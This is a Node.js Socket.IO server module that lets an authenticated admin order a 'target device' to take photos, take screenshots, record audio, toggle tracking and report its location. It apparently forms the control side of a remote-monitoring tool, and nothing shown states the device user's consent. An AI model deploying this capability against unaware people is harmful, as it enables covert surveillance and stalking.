module.exports = (io, socket) => {
  // Trigger photo capture on target device
  socket.on('trigger_photo', (data) => {
    if (!socket.isAdmin) {
      return socket.emit('unauthorized', { message: 'Admin authentication required' });
    }
    console.log('📸 Admin requested photo capture for device:', data.deviceId);
    io.to(data.deviceId).emit('take_photo', { camera: data.camera || 'front' });
  });

  // Trigger screenshot on target device
  socket.on('trigger_screenshot', (data) => {
    if (!socket.isAdmin) {
      return socket.emit('unauthorized', { message: 'Admin authentication required' });
    }
    console.log('📸 Admin requested screenshot capture for device:', data.deviceId);
    io.to(data.deviceId).emit('take_screenshot');
  });

  // Remote control toggle (start / stop tracking)
  socket.on('toggle_tracking', (data) => {
    if (!socket.isAdmin) {
      return socket.emit('unauthorized', { message: 'Admin authentication required' });
    }
    console.log(`📡 Admin requested to ${data.action} tracking for device:`, data.deviceId);
    io.to(data.deviceId).emit('remote_control', { action: data.action });
  });

  // Trigger audio recording
  socket.on('trigger_audio', (data) => {
    if (!socket.isAdmin) {
      return socket.emit('unauthorized', { message: 'Admin authentication required' });
    }
    console.log(`🎙️ Admin requested audio recording for device:`, data.deviceId, `Duration: ${data.duration}s`);
    io.to(data.deviceId).emit('trigger_audio', { duration: data.duration || 30 });
  });

  // Request one-time location update
  socket.on('request_current_location', (data) => {
    if (!socket.isAdmin) {
      return socket.emit('unauthorized', { message: 'Admin authentication required' });
    }
    console.log(`📍 Admin requested ONE-TIME location for device:`, data.deviceId);
    io.to(data.deviceId).emit('get_location_once');
  });
};
